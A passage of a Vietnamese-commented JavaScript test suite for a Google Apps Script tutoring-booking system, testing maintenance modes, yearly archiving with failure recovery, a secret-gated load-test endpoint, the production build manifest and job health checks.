  // Admin chủ động chọn NIGHTLY lại: lần cài sau giữ nguyên; cùng phiên bản: không sao lưu thêm
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('CALENDAR_MODE'), { value: 'NIGHTLY' }); });
  api.setupFirstRun(); api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('CALENDAR_MODE'), 'NIGHTLY');
  assert.strictEqual(Object.values(env.state.drive.files).filter(f => /_TRUOC_/.test(f.name)).length, 2, '1 bản lần đầu, 1 bản lần thử lại');
  // Bản sao Releases không bị dọn theo BACKUP_KEEP
  api.withLock_(() => { const t = api.table_('CONFIG'); t.update(t.byId('BACKUP_KEEP'), { value: '1' }); }); api.clearConfigCache_();
  api.nightlyBackup(); api.nightlyBackup();
  assert.ok(!copies[0].trashed, 'bản sao trước cập nhật còn nguyên');
});

t('I84', 'Bảo trì: READONLY chặn đặt, huỷ, lưu slot, đăng ký (không ghi, không lấy khoá) nhưng vẫn xem được; CLOSED chặn cả xem; admin và đăng nhập luôn chạy; OFF chạy lại', () => {
  const c = mk(), { api, env } = c;
  const s = tokenFor(c, 'S003'), tt = tokenFor(c, 'T001'), a = tokenFor(c, 'A01');
  const before = c.book('S003', [[K(14, 10), '19:00']])[0]; assert.ok(before.ok);
  api.setMaintMode_('READONLY', 'test');
  cfgSet(c, 'MAINTENANCE_UNTIL', '21:00 hôm nay');
  assert.ok(api.apiStudentHome(s).ok, 'vẫn xem được');
  const nB = c.rows('BOOKINGS').length, locks = env.state.lockCalls;
  const r = api.apiStudentBook(s, [{ date: K(15, 10), slot: '19:00' }], 'rid_maint_0001');
  assert.strictEqual(r.reason, 'MAINT_READONLY'); assert.ok(/bảo trì \(21:00 hôm nay\)/.test(r.message), r.message);
  assert.strictEqual(env.state.lockCalls, locks, 'không lấy khoá');
  assert.strictEqual(c.rows('BOOKINGS').length, nB);
  assert.strictEqual(api.apiStudentCancel(s, before.bookingId).reason, 'MAINT_READONLY');
  const tr = api.apiTutorSetAvailability(tt, [{ date: K(20, 10), slot: '08:00', open: true }]);
  assert.strictEqual(tr.reason, 'MAINT_READONLY'); assert.ok(/maintenance/.test(tr.message), 'tutor tiếng Anh: ' + tr.message);
  assert.strictEqual(api.apiSubmitRegistration(c.form()).reason, 'MAINT_READONLY');
  assert.ok(api.apiTutorHome(tt).ok);
  assert.ok(api.apiAdminBook(a, 'S005', [{ date: K(15, 10), slot: '20:00' }]).ok, 'admin đặt thay vẫn được');
  assert.strictEqual(JSON.parse(api.bootJson_({ page: 'student' })).maint.mode, 'READONLY');
  // Lần gửi lại cùng mã sau khi tắt bảo trì: chạy thật (kết quả bị chặn không được lưu làm kết quả cũ)
  api.setMaintMode_('CLOSED', 'test');
  assert.strictEqual(api.apiStudentHome(s).reason, 'MAINT_CLOSED');
  assert.strictEqual(api.apiTutorHome(tt).reason, 'MAINT_CLOSED');
  assert.ok(api.apiAdminHome(a).ok);
  assert.ok(api.apiExchangeToken(linkFor(c, 'S005'), UA_WIN).ok, 'đăng nhập vẫn chạy (admin phải vào được)');
  assert.ok(api.apiPublicInfo().ok);
  api.setMaintMode_('OFF', 'test');
  const r2 = api.apiStudentBook(s, [{ date: K(15, 10), slot: '19:00' }], 'rid_maint_0001');
  assert.ok(r2.ok && r2.data[0].ok && !r2.replay, JSON.stringify(r2));
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'MAINTENANCE_CLOSED'));
});

function archiveSetup(c) {
  const { api } = c;
  api.withLock_(() => {
    const sp = api.table_('STUDENT_PACKAGES');
    sp.insert({ sp_id: 'SP90001', student_id: 'S006', package_code: 'PASS_1M', status: 'EXPIRED', start_date: new Date(2026, 0, 20), end_date: new Date(2026, 1, 20), start_source: 'FIXED', purchased_at: new Date(2026, 0, 18) });
    // Gói hết hạn từ lâu nhưng job ngày chưa đổi sang EXPIRED: vẫn coi là đang chạy, giữ buổi
    sp.insert({ sp_id: 'SP90002', student_id: 'S002', package_code: 'PASS_1M', status: 'ACTIVE', start_date: new Date(2026, 0, 2), end_date: new Date(2026, 1, 1), start_source: 'FIXED', purchased_at: new Date(2026, 0, 1) });
    const b = api.table_('BOOKINGS');
    const mkB = (id, d, status, extra) => b.insert(Object.assign({ booking_id: id, student_id: 'S006', tutor_id: 'T001', sp_id: '', date: d, slot: '19:00', status, created_at: new Date(d.getTime() - 86400000), cal_state: 'CREATED' }, extra || {}));
    mkB('BK999990', new Date(2026, 1, 10), 'COMPLETED', { sp_id: 'SP90001' });
    mkB('BK900002', new Date(2026, 1, 11), 'CANCELLED_STUDENT', { sp_id: 'SP90001' });
    mkB('BK900003', new Date(2026, 1, 12), 'COMPLETED', { student_id: 'S004', sp_id: 'SP00004' });
    mkB('BK900004', new Date(2026, 1, 13), 'COMPLETED', { admin_action: 'Đổi tutor' });
    mkB('BK900005', new Date(2026, 2, 20), 'TECH_ISSUE', { slot: '08:00' });
    mkB('BK900006', new Date(2026, 4, 2), 'COMPLETED');
    mkB('BK900007', new Date(2025, 11, 30), 'COMPLETED');
    mkB('BK900008', new Date(2026, 0, 15), 'COMPLETED', { student_id: 'S002', sp_id: 'SP90002' });
    const av = api.table_('AVAILABILITY');
    av.insert({ avail_id: 'AV900001', tutor_id: 'T001', date: new Date(2026, 1, 10), slot: '19:00', status: 'OPEN', created_at: new Date(2026, 1, 1) });
    av.insert({ avail_id: 'AV900002', tutor_id: 'T001', date: new Date(2026, 1, 11), slot: '19:00', status: 'CANCEL_PENDING', created_at: new Date(2026, 1, 1) });
    const lg = api.table_('ACTIVITY_LOG');
    lg.insert({ time: new Date(2026, 5, 1, 9, 30, 15), actor: 'x', action: 'OLD', entity: 'E', entity_id: '1', detail: '=cũ' });
    lg.insert({ time: new Date(2026, 8, 1, 9, 30), actor: 'x', action: 'RECENT', entity: 'E', entity_id: '2', detail: '' });
    const nt = api.table_('NOTIFICATIONS');
    nt.insert({ notif_id: 'N9000001', time: new Date(2026, 5, 2), level: 'CRITICAL', event: 'X', channel: 'EMAIL', message: 'chưa đọc', read: false });
    nt.insert({ notif_id: 'N9000002', time: new Date(2026, 5, 2), level: 'CRITICAL', event: 'X', channel: 'EMAIL', message: 'đã đọc', read: true });
    nt.insert({ notif_id: 'N9000003', time: new Date(2026, 5, 3), level: 'INFO', event: 'Y', channel: 'LOG', message: 'info', read: false });
    api.table_('MAIL_LOG').insert({ time: new Date(2026, 4, 1, 8, 0), to: 'a@b.c', subject: '+84 tiêu đề', kind: 'K' });
  });
}
const archSheet = (c, year, tab) => { const id = c.env.state.props['ARCH_FILE_STAGING_' + year]; return id ? c.env.state.spreadsheets[id].sheets[tab] : null; };

t('I85', 'Lưu trữ: chép dòng cũ đã xong sang file theo năm, đọc lại đủ rồi mới bỏ khỏi DB; gói còn chạy, admin_action, chờ duyệt, thông báo chưa đọc giữ lại; mã mới không trùng mã đã lưu trữ', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  const st = api.archiveStatus_();
  assert.strictEqual(st.tabs.find(x => x.tab === 'BOOKINGS').eligible, 4, JSON.stringify(st.tabs));
  const r1 = api.runArchive_();
  assert.ok(r1.every(x => !x.error), JSON.stringify(r1));
  // 5K: một lượt chạy nhiều lô tới khi hết: năm 2025 rồi 2026, cùng một lượt
  const b1 = r1.find(x => x.tab === 'BOOKINGS');
  assert.ok(b1.archived === 4 && b1.batches === 2 && b1.more === false, JSON.stringify(b1));
  assert.ok(c.rows('ACTIVITY_LOG').filter(l => l.action === 'ARCHIVED' && /"tab"|BOOKINGS/.test(l.entity_id + l.detail)).map(l => JSON.parse(l.detail).year).join().indexOf('2025') === 0, 'năm cũ nhất trước');
  const r2 = api.runArchive_();
  assert.strictEqual(r2.find(x => x.tab === 'BOOKINGS').archived, 0);
  const ids = c.rows('BOOKINGS').map(b => b.booking_id);
  ['BK999990', 'BK900002', 'BK900005', 'BK900007'].forEach(id => assert.ok(ids.indexOf(id) === -1, id + ' đã chuyển'));
  ['BK900003', 'BK900004', 'BK900006', 'BK900008'].forEach(id => assert.ok(ids.indexOf(id) !== -1, id + ' giữ lại'));
  const a26 = archSheet(c, 2026, 'BOOKINGS'), a25 = archSheet(c, 2025, 'BOOKINGS');
  assert.strictEqual(a25.values.length, 2); assert.strictEqual(a26.values.length, 4);
  const h = a26.values[0];
  assert.deepStrictEqual(h.slice(-2), ['_archived_at', '_batch']);
  const tech = a26.values.find(v => v[0] === 'BK900005');
  assert.strictEqual(tech[h.indexOf('slot')], '08:00', 'slot giữ dạng chữ');
  assert.strictEqual(c.rows('AVAILABILITY').filter(x => /^AV9/.test(x.avail_id)).map(x => x.avail_id).join(), 'AV900002');
  assert.deepStrictEqual(c.rows('ACTIVITY_LOG').filter(l => l.action === 'OLD' || l.action === 'RECENT').map(l => l.action), ['RECENT']);
  assert.strictEqual(archSheet(c, 2026, 'ACTIVITY_LOG').values.find(v => v[2] === 'OLD')[5], '=cũ', 'chữ bắt đầu bằng = không thành công thức');
  assert.deepStrictEqual(c.rows('NOTIFICATIONS').filter(n => /^N9/.test(n.notif_id)).map(n => n.notif_id), ['N9000001']);
  assert.ok(!c.rows('MAIL_LOG').some(m => m.to === 'a@b.c'));
  // Mã mới
  const nb = c.book('S003', [[K(14, 10), '19:00']])[0];
  assert.strictEqual(nb.bookingId, 'BK999991', 'không cấp lại mã đã lưu trữ: ' + nb.bookingId);
  assert.ok(c.rows('ACTIVITY_LOG').filter(l => l.action === 'ARCHIVED').length >= 5);
  // Chạy lại: không còn gì, không chép trùng
  const r3 = api.runArchive_();
  assert.ok(r3.every(x => !x.archived), JSON.stringify(r3));
  assert.strictEqual(archSheet(c, 2026, 'BOOKINGS').values.length, 4);
  // File lưu trữ nằm trong thư mục lưu trữ, CONFIG có ARCHIVE_FOLDER_ID
  api.clearConfigCache_();
  const fid = api.cfg_('ARCHIVE_FOLDER_ID');
  assert.ok(fid && env.state.drive.files[env.state.props.ARCH_FILE_STAGING_2026].parent === fid);
  // Báo cáo tháng 2 (đã lưu trữ) ghi rõ không đủ
  api.refreshReportMonth_(2026, 2);
  const rep = env.state.spreadsheets.DB_STAGING_TEST.sheets.REPORT_MONTH.values;
  assert.ok(rep.some(r => /CHÚ Ý: buổi của tháng này đã chuyển/.test(String(r[0]))), 'báo cáo tháng cũ có dòng chú ý');
});

t('I86', 'Lưu trữ an toàn khi hỏng: đọc lại thiếu thì không bỏ dòng nào và báo Khẩn; hỏng lúc bỏ khỏi DB thì lần sau hoàn tất đúng lô, không chép lần hai; job chỉ chạy từ 03:00, 1 lần mỗi ngày', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  const n0 = c.rows('BOOKINGS').length;
  // 1. Đọc lại thiếu (giả lập file lưu trữ mất dòng ngay sau khi ghi)
  const realFlush = env.globals.SpreadsheetApp.flush;
  env.globals.SpreadsheetApp.flush = () => { const sh = archSheet(c, 2025, 'BOOKINGS'); if (sh && sh.values.length > 1) sh.values.pop(); };
  let bad = null;
  try { api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000)); } catch (e) { bad = e.message; }
  env.globals.SpreadsheetApp.flush = realFlush;
  assert.ok(/đọc lại thiếu dòng/.test(bad), 'báo lỗi: ' + bad);
  assert.strictEqual(c.rows('BOOKINGS').length, n0, 'không bỏ dòng nào');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'ARCHIVE_FAILED' && n.level === 'CRITICAL'));
  assert.ok(env.state.props.ARCH_OPEN_BOOKINGS, 'giữ lô mở để lượt sau đối chiếu');
  const fix = api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  assert.ok(fix.recovered && fix.archived === 0, 'dòng không có trong file lưu trữ thì ở lại DB: ' + JSON.stringify(fix));
  assert.strictEqual(c.rows('BOOKINGS').length, n0);
  api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  assert.strictEqual(archSheet(c, 2025, 'BOOKINGS').values.filter(v => v[0] === 'BK900007').length, 1, 'chép lại đúng 1 bản');
  assert.strictEqual(c.rows('BOOKINGS').length, n0 - 1);
  // 2. Hỏng đúng lúc bỏ khỏi DB (sau khi ghi dòng giữ lại, trước khi xoá đuôi): lô còn mở
  const avBefore = c.rows('AVAILABILITY').map(a => a.avail_id);
  env.state.failClearOnce = true;
  const half = api.withLock_(() => { try { return api.archiveTabInLock_('AVAILABILITY', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000); } catch (e) { return { error: e.message }; } });
  assert.ok(half.error, 'giả lập lỗi');
  assert.ok(env.state.props.ARCH_OPEN_AVAILABILITY, 'lô mở được ghi nhớ');
  assert.ok(env.state.props.PURGE_OPEN_AVAILABILITY, 'lần bỏ dòng dở được ghi nhớ');
  // Bị cắt giữa "ghi dòng giữ lại" và "xoá đuôi": tab không bao giờ trống, không mất dòng nào (chỉ thừa đuôi)
  const midIds = c.rows('AVAILABILITY').map(a => a.avail_id);
  avBefore.filter(id => id !== 'AV900001').forEach(id => assert.ok(midIds.indexOf(id) !== -1, 'không mất ' + id));
  // Admin gõ thêm 1 dòng tay sau khi hỏng: lần dọn sau không được đụng
  const shAv = env.state.spreadsheets.DB_STAGING_TEST.sheets.AVAILABILITY, colsAv = api.SCHEMA.AVAILABILITY.cols;
  const manual = colsAv.map(c2 => c2 === 'avail_id' ? 'AV999999' : c2 === 'tutor_id' ? 'T002' : c2 === 'slot' ? '22:00' : c2 === 'status' ? 'OPEN' : c2 === 'date' ? new Date(2026, 9, 30) : '');
  shAv.values.push(manual);
  const rec = api.withLock_(() => api.archiveTabInLock_('AVAILABILITY', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  assert.ok(rec.recovered, JSON.stringify(rec));
  const afterIds = c.rows('AVAILABILITY').map(a => a.avail_id);
  assert.ok(afterIds.indexOf('AV900001') === -1);
  assert.strictEqual(afterIds.length, new Set(afterIds).size, 'hết dòng trùng ở đuôi');
  avBefore.filter(id => id !== 'AV900001').concat(['AV999999']).forEach(id => assert.ok(afterIds.indexOf(id) !== -1, 'còn ' + id));
  assert.ok(!env.state.props.PURGE_OPEN_AVAILABILITY);
  assert.strictEqual(archSheet(c, 2026, 'AVAILABILITY').values.filter(v => v[0] === 'AV900001').length, 1, 'chỉ 1 bản trong file lưu trữ');
  assert.ok(!env.state.props.ARCH_OPEN_AVAILABILITY);
  // 3. Job: trước 03:00 không làm; từ 03:00 làm 1 lần
  c.at('2026-10-13 02:10'); api.hourlyJob();
  assert.strictEqual(c.rows('BOOKINGS').length, n0 - 1, 'chưa tới giờ');
  c.at('2026-10-13 03:05'); assert.deepStrictEqual(api.hourlyJob().archive, { skipped: 'NO_BACKUP' }, 'chưa có bản sao DB đêm nay: không chuyển dòng');
  c.at('2026-10-13 03:06'); api.nightlyBackup();
  api.setMaintMode_('CLOSED', 'test');
  assert.deepStrictEqual(api.hourlyJob().archive, { skipped: 'MAINTENANCE' }, 'đang bảo trì: không chạy (admin có thể đang sửa tay)');
  api.setMaintMode_('OFF', 'test');
  c.at('2026-10-13 03:10'); const h1 = api.hourlyJob();
  assert.ok(h1.archive && h1.archive.length === 6, JSON.stringify(h1.archive));   // 5K: thêm METRICS
  c.at('2026-10-13 04:10'); const h2 = api.hourlyJob();
  assert.strictEqual(h2.archive, null, '1 lần mỗi ngày');
  cfgSet(c, 'ARCHIVE_ENABLED', 'FALSE');
  c.at('2026-10-14 03:10'); assert.strictEqual(api.hourlyJob().archive, null, 'tắt được');
});

t('I87', 'Thử tải: cổng POST đóng mặc định (không chạm Sheets); mở bằng khoá, chỉ thay mặt tài khoản @loadtest.invalid; đặt qua cổng đi đúng API thật, gửi lại cùng mã không trùng; email, Calendar không gửi tới địa chỉ giả; PRODUCTION xoá khoá', () => {
  const c = mk(), { api, env } = c;
  const post = (o) => JSON.parse(api.doPost({ postData: { contents: JSON.stringify(o) } }).getContent());
  const spy = spyOpen(c); api.clearDbCache_();
  const l0 = env.state.lockCalls;
  assert.strictEqual(post({ secret: 'x', fn: 'info' }).reason, 'LOADTEST_OFF');
  assert.strictEqual(spy.n, 0, 'đóng: không mở Sheets'); assert.strictEqual(env.state.lockCalls, l0);
  spy.restore();
  const seed = api.loadTestSeed_(5, 2, 3);
  assert.deepStrictEqual([seed.students, seed.tutors], [5, 2]);
  assert.strictEqual(api.loadTestSeed_(5, 2, 3).students, 0, 'chạy lại không tạo trùng');
  const on = api.loadTestEnable_(1);
  assert.strictEqual(post({ secret: on.secret.slice(0, -1) + 'x', fn: 'info' }).reason, 'FORBIDDEN');
  assert.strictEqual(post({ secret: on.secret, fn: 'home', as: EMAIL.S003 }).reason, 'FORBIDDEN', 'không thay mặt người thật');
  assert.strictEqual(post({ secret: on.secret, fn: 'apiAdminHome', as: 'lt0001@loadtest.invalid' }).reason, 'INVALID_INPUT');
  const home = post({ secret: on.secret, fn: 'home', as: 'lt0001@loadtest.invalid', args: [{ slots: true }] });
  assert.ok(home.ok && home.server_ms >= 0, JSON.stringify(home).slice(0, 300));
  const day = home.data.slots.find(d => d.slots && d.slots.length), sl = day.slots[0];
  const req = [{ date: day.date, slot: typeof sl === 'string' ? sl : sl.slot }];
  const b1 = post({ secret: on.secret, fn: 'book', as: 'lt0001@loadtest.invalid', args: [req, 'rid_lt_000001'] });
  const b2 = post({ secret: on.secret, fn: 'book', as: 'lt0001@loadtest.invalid', args: [req, 'rid_lt_000001'] });
  assert.ok(b1.ok && b1.data[0].ok, JSON.stringify(b1)); assert.ok(b2.replay, 'gửi lại nhận kết quả cũ');
  const sent = env.state.mails.filter(m => /loadtest\.invalid/.test(m.to)).length;
  assert.strictEqual(sent, 0, 'không gửi email tới địa chỉ giả');
  assert.ok(c.rows('MAIL_LOG').some(m => /loadtest\.invalid/.test(m.to)), 'vẫn ghi MAIL_LOG như thật');
  c.at('2026-10-12 12:00'); cfgSet(c, 'CALENDAR_MODE', 'QUEUE'); api.runCalendarQueue_({});
  const ev = Object.values(env.state.events).find(e => /LT Student 0001/.test(e.summary));
  assert.ok(ev, 'sự kiện được tạo');
  assert.ok(ev.attendees.every(a => !/loadtest\.invalid/.test(a.email)), 'không mời địa chỉ giả');
  const chk = api.loadTestCheck_();
  assert.deepStrictEqual([chk.bookings, chk.duplicateRequest, chk.doubleBookedSlot, chk.overPerDay], [1, 0, 0, 0], JSON.stringify(chk));
  const lk = post({ secret: on.secret, fn: 'link', as: 'lt0002@loadtest.invalid' });
  assert.ok(lk.ok && /page=auth&t=[a-f0-9]{64}/.test(lk.data.url));
  // Hết giờ: tự đóng
  const realNow = Date.now; Date.now = () => realNow() + 2 * 3600e3;
  try { assert.strictEqual(post({ secret: on.secret, fn: 'info' }).reason, 'LOADTEST_OFF'); } finally { Date.now = realNow; }
  // PRODUCTION: cổng luôn đóng kể cả còn khoá
  const on2 = api.loadTestEnable_(1);
  env.state.props.ENV = 'PRODUCTION';
  assert.strictEqual(post({ secret: on2.secret, fn: 'info' }).reason, 'LOADTEST_OFF', 'PRODUCTION: cổng đóng');
  env.state.props.ENV = 'STAGING';
  env.state.activeUserEmail = env.state.effectiveUserEmail; env.state.activeSpreadsheetId = 'DB_STAGING_TEST';
  api.switchToProduction();
  assert.ok(!env.state.props.LOADTEST_SECRET, 'PRODUCTION xoá khoá');
  assert.throws(() => api.loadTestEnable_(1), /PRODUCTION/);
});

t('I88', 'Bản PRODUCTION chia file (luật 44): mỗi file src một file, có MANIFEST băm; nạp theo thứ tự NGƯỢC vẫn cài đặt, kiểm tra hệ thống, thêm tutor, mở trang được', () => {
  const fs = require('fs'), path = require('path'), os = require('os');
  const out = fs.mkdtempSync(path.join(os.tmpdir(), 'tp_prod_'));
  require('child_process').execFileSync(process.execPath, [path.join(__dirname, 'build_dist.js'), '--production'], { env: Object.assign({}, process.env, { TP_PROD_OUT: out }) });
  const files = fs.readdirSync(out).filter(f => f.endsWith('.gs'));
  assert.strictEqual(files.length, require('./load').sourceFiles().length);
  const man = fs.readFileSync(path.join(out, 'MANIFEST.txt'), 'utf8');
  files.forEach(f => assert.ok(new RegExp('^' + f.replace('.', '\\.') + '  [a-f0-9]{64}$', 'm').test(man), 'MANIFEST thiếu ' + f));
  const src = files.slice().sort().reverse().map(f => fs.readFileSync(path.join(out, f), 'utf8')).join('\n');
  const { api, env } = load({ props: {}, source: src, srcDir: out });
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  env.createSpreadsheet('NEW_DB', 'THAIPUT_DB_STAGING'); env.state.activeSpreadsheetId = 'NEW_DB';
  assert.ok(api.setupFirstRun().ok);
  api.clearDbCache_(); api.clearConfigCache_();
  assert.deepStrictEqual(api.testSystem().errors, []);
  assert.strictEqual(api.addTutor_({ name: 'Vân', email: 'van@tutor.test', phone: '0901000001' }, 'ADMIN').userId, 'T001');
  const html = api.doGet({ parameter: { page: 'home' } }).getContent();
  ['T.views.home', 'T.views.tutor', 'T.maint'].forEach(k => assert.ok(html.indexOf(k) !== -1, 'thiếu ' + k));
  fs.rmSync(out, { recursive: true, force: true });
});

t('I89', 'Giám sát (Q4): health trả OK khi job còn chạy, STALE khi một job ngừng quá hạn (hourly 150, reminder 45, calendar 30 phút); bận vẫn tính là còn sống; health không mở Sheets', () => {
  const c = mk(), { api, env } = c;
  const health = () => api.doGet({ parameter: { page: 'health' } }).getContent();
  assert.strictEqual(health(), 'OK', 'chưa có mốc: OK');
  api.hourlyJob(); api.reminderJob(); api.calendarJob({ triggerUid: 'x' });
  ['HB_hourlyJob', 'HB_reminderJob', 'HB_calendarJob'].forEach(k => assert.ok(Number(env.state.props[k]) > 0, k));
  const spy = spyOpen(c); api.clearDbCache_();
  assert.strictEqual(health(), 'OK'); assert.strictEqual(spy.n, 0, 'không mở Sheets'); spy.restore();
  const realNow = Date.now;
  try {
    Date.now = () => realNow() + 31 * 60000; assert.strictEqual(health(), 'STALE', 'calendarJob ngừng 31 phút');
    env.state.lockBusy = true; api.calendarJob({ triggerUid: 'x' }); env.state.lockBusy = false;
    Date.now = () => realNow() + 46 * 60000;
    env.state.lockBusy = true; api.calendarJob({ triggerUid: 'x' }); api.reminderJob(); env.state.lockBusy = false;
    assert.strictEqual(health(), 'OK', 'bận vẫn ghi nhịp (reminderJob đã quá 45 phút từ lượt chạy thật)');
    Date.now = () => realNow() + 151 * 60000; api.reminderJob(); api.calendarJob({ triggerUid: 'x' });
    assert.strictEqual(health(), 'STALE', 'hourlyJob ngừng 151 phút');
    // Job lỗi thì không ghi nhịp (để STALE báo được khi job lỗi lặp lại)
    api.hourlyJob(); assert.strictEqual(health(), 'OK');
    const hb = env.state.props.HB_reminderJob; env.state.calendarFailNext = 0;
    const realOpen = env.globals.SpreadsheetApp.openById; env.globals.SpreadsheetApp.openById = () => { throw new Error('Service Spreadsheets failed (giả lập)'); };
    try { api.clearDbCache_(); api.reminderJob(); } catch (e) { } finally { env.globals.SpreadsheetApp.openById = realOpen; }
    assert.strictEqual(env.state.props.HB_reminderJob, hb, 'job lỗi: không ghi nhịp');
    // nightlyBackup 1 lần mỗi ngày: quá 26 giờ là STALE
    api.nightlyBackup();
    Date.now = () => realNow() + 151 * 60000 + 27 * 3600e3; api.hourlyJob(); api.reminderJob(); api.calendarJob({ triggerUid: 'x' }); api.dailyJob();
    assert.strictEqual(health(), 'STALE', 'sao lưu đêm ngừng quá 26 giờ');
  } finally { Date.now = realNow; env.state.lockBusy = false; }
});

t('I90', 'Lưu trữ khi admin sửa tay cùng lúc (soát R1 M1, R2 T1): sắp xếp lại tab và gõ thêm dòng giữa lúc chép và lúc bỏ thì không mất, không trùng; link "mở đúng dòng" của thông báo dời theo; file lưu trữ ở thùng rác thì dừng; mỗi tháng sao 1 bản file lưu trữ vào Releases', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  // Thông báo trỏ tới dòng AV900002 (giữ lại) và một dòng ở cuối tab AVAILABILITY
  api.clearDbCache_();
  const avRows = api.table_('AVAILABILITY').all(), keepRow = avRows.find(a => a.avail_id === 'AV900002')._row, lastAv = avRows[avRows.length - 1];
  api.withLock_(() => { const nt = api.table_('NOTIFICATIONS');
    nt.insert({ notif_id: 'N9100001', time: new Date(2026, 9, 11), level: 'WARNING', event: 'TUTOR_CANCEL_REQUEST', channel: 'EMAIL', message: 'x', link: api.rowLink_('AVAILABILITY', keepRow), read: false });
    nt.insert({ notif_id: 'N9100002', time: new Date(2026, 9, 11), level: 'WARNING', event: 'TUTOR_CANCEL_REQUEST', channel: 'EMAIL', message: 'y', link: api.rowLink_('AVAILABILITY', lastAv._row), read: false }); });
  const before = c.rows('BOOKINGS').map(b => b.booking_id);
  // Giữa lúc chép (flush sau khi ghi file lưu trữ) và lúc bỏ: đảo ngược thứ tự BOOKINGS, gõ thêm 1 dòng tay
  const realFlush = env.globals.SpreadsheetApp.flush; let fired = false;
  env.globals.SpreadsheetApp.flush = () => {
    const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.BOOKINGS, cols = api.SCHEMA.BOOKINGS.cols;
    if (fired || !archSheet(c, 2025, 'BOOKINGS')) return;
    fired = true;
    const body = sh.values.slice(1).filter(r => r.some(x => x !== '' && x !== null && x !== undefined)).reverse();
    sh.values = [sh.values[0]].concat(body);
    sh.values.push(cols.map(k => k === 'booking_id' ? 'BK777777' : k === 'student_id' ? 'S003' : k === 'tutor_id' ? 'T002' : k === 'date' ? new Date(2026, 9, 20) : k === 'slot' ? '21:00' : k === 'status' ? 'CONFIRMED' : ''));
  };
  const r = api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  env.globals.SpreadsheetApp.flush = realFlush;
  assert.ok(fired && r.archived === 1, JSON.stringify(r));
  const after = c.rows('BOOKINGS').map(b => b.booking_id);
  assert.ok(after.indexOf('BK900007') === -1, 'dòng đã chép được bỏ');
  before.filter(id => id !== 'BK900007').concat(['BK777777']).forEach(id => assert.ok(after.indexOf(id) !== -1, 'không mất ' + id));
  assert.strictEqual(after.length, new Set(after).size, 'không trùng');
  // Link thông báo dời theo khi AVAILABILITY bỏ dòng phía trên
  api.withLock_(() => api.archiveTabInLock_('AVAILABILITY', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  api.clearDbCache_();
  const av2 = api.table_('AVAILABILITY').all(), n1 = api.table_('NOTIFICATIONS').byId('N9100001'), n2 = api.table_('NOTIFICATIONS').byId('N9100002');
  assert.ok(n1.link.endsWith('&range=A' + av2.find(a => a.avail_id === 'AV900002')._row), 'link trỏ đúng dòng mới: ' + n1.link);
  assert.ok(n2.link.endsWith('&range=A' + av2.find(a => a.avail_id === lastAv.avail_id)._row), n2.link);
  // File lưu trữ ở thùng rác: dừng, không bỏ dòng
  env.state.drive.files[env.state.props.ARCH_FILE_STAGING_2026].trashed = true;
  const n0 = c.rows('BOOKINGS').length;
  let err = null; try { api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000)); } catch (e) { err = e.message; }
  assert.ok(/thùng rác/.test(err), err); assert.strictEqual(c.rows('BOOKINGS').length, n0);
  env.state.drive.files[env.state.props.ARCH_FILE_STAGING_2026].trashed = false;
  // Mỗi tháng 1 bản sao file lưu trữ vào Releases
  api.runArchive_();
  const copies = Object.values(env.state.drive.files).filter(f => /· bản sao \d{8}$/.test(f.name));
  assert.strictEqual(copies.length, 2, '2 file năm, mỗi file 1 bản');
  assert.ok(copies.every(f => f.parent === env.state.props.RELEASES_FOLDER_ID));
  archiveSetup2(c); api.runArchive_();
  assert.strictEqual(Object.values(env.state.drive.files).filter(f => /· bản sao \d{8}$/.test(f.name)).length, 2, 'cùng tháng không sao thêm');
});
function archiveSetup2(c) { c.api.withLock_(() => c.api.table_('ACTIVITY_LOG').insert({ time: new Date(2026, 4, 2), actor: 'x', action: 'OLD2', entity: 'E', entity_id: '3', detail: '' })); }

t('I91', 'Bảo trì không bỏ sót API (soát R2 T9): mọi api* ghi của học viên, tutor, form đăng ký đều bị chặn ở READONLY; lượt đặt đã ghi mà gửi lại lúc bảo trì vẫn nhận "đã đặt" (soát R2 T4); trang nhận trạng thái bảo trì qua r.maint; đủ chữ bảo trì 2 thứ tiếng', () => {
  const c = mk(), { api } = c;
  const fs = require('fs'), path = require('path');
  const app = fs.readFileSync(path.join(__dirname, '..', 'src', 'ui', 'App.html'), 'utf8');
  const reads = Object.keys(eval('(' + app.match(/var READ_APIS = (\{[\s\S]*?\});/)[1] + ')'));
  const exempt = ['apiRequestLogin', 'apiExchangeToken', 'apiGoogleExchange', 'apiLogout', 'apiClientReport', 'apiPublicInfo'];
  const all = Object.keys(api).filter(n => /^api[A-Z]\w*[^_]$/.test(n) && typeof api[n] === 'function');
  const writes = all.filter(n => !/^apiAdmin/.test(n) && reads.indexOf(n) === -1 && exempt.indexOf(n) === -1);
  assert.ok(writes.length >= 8, writes.join());
  writes.forEach(n => assert.ok(api.MAINT_WRITE_APIS_[n], n + ' là API ghi nhưng không có trong MAINT_WRITE_APIS_ (Maintenance.gs)'));
  Object.keys(api.MAINT_IDEM_APIS_).forEach(n => assert.ok(api.MAINT_WRITE_APIS_[n], n));
  // Gửi lại lượt đặt đã ghi đúng lúc bật bảo trì
  const s = tokenFor(c, 'S003');
  const first = api.apiStudentBook(s, [{ date: K(14, 10), slot: '19:00' }], 'rid_maint_replay1');
  assert.ok(first.ok && first.data[0].ok);
  api.setMaintMode_('READONLY', 'test');
  const again = api.apiStudentBook(s, [{ date: K(14, 10), slot: '19:00' }], 'rid_maint_replay1');
